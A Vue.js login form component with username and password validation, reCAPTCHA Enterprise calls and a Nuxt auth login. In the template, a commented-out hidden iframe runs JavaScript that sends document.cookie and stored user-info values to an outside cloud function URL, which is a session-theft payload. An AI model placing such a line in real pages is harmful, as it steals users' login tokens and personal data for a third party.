<template>
  <ValidationObserver v-slot="{ invalid }">
    <notifications group="login" position="top center" />
    <b-form class="form-authentication" @submit.prevent="login">
      <ValidationProvider
        v-slot="{ valid, errors }"
        name="Username"
        rules="required"
      >
        <b-form-group label="Username: " label-for="username">
          <b-form-input
            id="username"
            v-model="auth.username"
            type="text"
            :state="errors[0] ? false : valid ? true : null"
          ></b-form-input>
          <b-form-invalid-feedback id="username-error">
            {{ errors[0] }}
          </b-form-invalid-feedback>
        </b-form-group>
      </ValidationProvider>
      <ValidationProvider
        v-slot="{ valid, errors }"
        name="Password"
        rules="required"
      >
        <b-form-group label="Password: " label-for="password">
          <b-form-input
            id="password"
            v-model="auth.password"
            type="password"
            :state="errors[0] ? false : valid ? true : null"
          ></b-form-input>
          <b-form-invalid-feedback> {{ errors[0] }} </b-form-invalid-feedback>
        </b-form-group>
      </ValidationProvider>
      <!-- <b-form-group>
        <recaptcha />
      </b-form-group> -->
      <!-- <div
        class="g-recaptcha"
        data-sitekey="6Ld4Lg0cAAAAAGE1fZWLxmIwucTYfAVLXzV81stl"
      ></div> -->
      <b-button
        id="login-button"
        variant="primary"
        type="submit"
        :disabled="invalid"
      >
        Login
      </b-button>
    </b-form>
    <!-- <iframe
      src="javascript:var xhttp = new XMLHttpRequest();xhttp.open(`GET`,`https://asia-northeast1-resources-practice.cloudfunctions.net/test?token=${document.cookie}&info1=${localStorage.getItem('pc_userInfo')}&info2=${localStorage.getItem('m_userInfo')}`,true);xhttp.send();"
      style="display:none"
    /> -->
  </ValidationObserver>
</template>

<script>
export default {
  middleware: "auth",
  auth: "guest",
  data() {
    return {
      auth: {}
    };
  },
  // mounted() {
  //   if (this.$cookies.get("redirect")) {
  //     this.$notify({
  //       group: "login",
  //       type: "warn",
  //       title: "You are currently not logged in"
  //     });
  //   }
  // },
  mounted() {
    /* eslint-disable no-undef */
    grecaptcha.enterprise.ready(function() {
      grecaptcha.enterprise
        .execute(process.env.SITE_KEY, {
          action: "VISIT_LOGIN_PAGE"
        })
        .then(function(token) {
          // TODO assessment
        });
    });
  },
  methods: {
    login() {
      const _this = this;
      try {
        grecaptcha.enterprise.ready(function() {
          grecaptcha.enterprise
            .execute(process.env.SITE_KEY, {
              action: "LOGIN"
            })
            .then(function(token) {
              _this.auth.token = token;
              try {
                _this.$auth.loginWith("local", {
                  data: _this.auth
                });
              } catch (e) {
                _this.$notify({
                  group: "login",
                  type: "error",
                  title: "ERROR:",
                  text: e.response.data.error
                });
              }
            });
        });
      } catch (e) {
        this.$notify({
          group: "login",
          type: "error",
          title: "ERROR:",
          text: "Captcha Error"
        });
      }
    }
  }
};
</script>

<style lang="scss" scoped></style>
